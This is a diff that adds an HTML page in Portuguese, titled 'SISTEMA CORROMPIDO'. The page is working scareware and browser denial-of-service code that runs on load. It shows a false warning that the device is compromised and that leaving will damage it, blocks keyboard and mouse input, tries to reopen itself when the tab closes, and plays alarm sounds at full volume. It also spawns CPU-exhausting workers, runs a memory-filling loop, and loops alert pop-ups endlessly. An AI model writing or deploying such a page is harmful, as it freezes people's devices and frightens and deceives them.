@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SISTEMA CORROMPIDO</title>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+            background: black;
+            color: #ff0000;
+            font-family: monospace;
+            font-size: 36px;
+            text-align: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            user-select: none;
+            cursor: none;
+        }
+        #message {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: panic 0.2s infinite;
+        }
+        @keyframes panic {
+            0% { color: #ff0000; transform: translate(-50%, -50%) scale(1); }
+            50% { color: #00ff00; transform: translate(-50%, -50%) scale(1.2); }
+            100% { color: #ff0000; transform: translate(-50%, -50%) scale(1); }
+        }
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body>
+    <div id="message">⚠️ SISTEMA CORROMPIDO! NÃO TENTE SAIR! ⚠️</div>
+    <canvas id="glitch"></canvas>
+    <audio id="siren1" loop><source src="https://www.soundjay.com/alarms/sounds/alarm-01.mp3" type="audio/mpeg"></audio>
+    <audio id="siren2" loop><source src="https://www.soundjay.com/alarms/sounds/alarm-02.mp3" type="audio/mpeg"></audio>
+    <script>
+        // Bloquear fechamento da aba
+        window.addEventListener('beforeunload', e => {
+            e.preventDefault();
+            e.returnValue = 'SISTEMA EM COLAPSO! SAIR PODE DANIFICAR O DISPOSITIVO!';
+            window.open(window.location.href, '_blank'); // Tenta reabrir
+        });
+
+        // Bloquear teclado e mouse
+        document.addEventListener('keydown', e => e.preventDefault());
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('click', e => e.preventDefault());
+
+        // Pop-ups agressivos
+        function spamAlerts() {
+            while (true) {
+                alert('⚠️ ERRO CRÍTICO 0xDEAD! DISPOSITIVO COMPROMETIDO!');
+            }
+        }
+
+        // Tocar áudio alto
+        const siren1 = document.getElementById('siren1');
+        const siren2 = document.getElementById('siren2');
+        siren1.volume = 1.0;
+        siren2.volume = 1.0;
+        siren1.play().catch(() => {});
+        siren2.play().catch(() => {});
+
+        // Múltiplos Web Workers para sobrecarga
+        const workerCode = `
+            while (true) {
+                let x = Math.random() * 1000000;
+                for (let i = 0; i < 10000000; i++) {
+                    x = Math.sin(x) + Math.cos(x) + Math.tan(x);
+                }
+            }
+        `;
+        for (let i = 0; i < 10; i++) { // 10 workers
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const worker = new Worker(URL.createObjectURL(blob));
+        }
+
+        // Fork bomb para RAM
+        function forkBomb() {
+            while (true) {
+                let arr = new Array(10000000).fill(Math.random());
+                arr.map(x => x * x * Math.random());
+            }
+        }
+        for (let i = 0; i < 5; i++) { // 5 instâncias
+            setTimeout(forkBomb, 0);
+        }
+
+        // Animação pesada no canvas
+        const canvas = document.getElementById('glitch');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        function glitchEffect() {
+            for (let i = 0; i < 5000; i++) { // Mais partículas
+                ctx.fillStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                ctx.fillRect(
+                    Math.random() * canvas.width,
+                    Math.random() * canvas.height,
+                    Math.random() * 200,
+                    Math.random() * 200
+                );
+            }
+            ctx.globalAlpha = 0.1;
+            ctx.fillStyle = 'rgba(0,0,0,0.1)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            requestAnimationFrame(glitchEffect);
+        }
+        glitchEffect();
+
+        // Alterar cursor
+        document.body.style.cursor = 'url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAABYSURBVFhH7dcxCoAwEENR+/7PeO8tsYO4gYlQSIiIuODLGZhMljOwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCw8A+4AaT2y7VowAAAABJRU5ErkJggg=="), auto';
+
+        // Spam de alertas imediatos
+        spamAlerts();
+    </script>
+</body>
+</html>
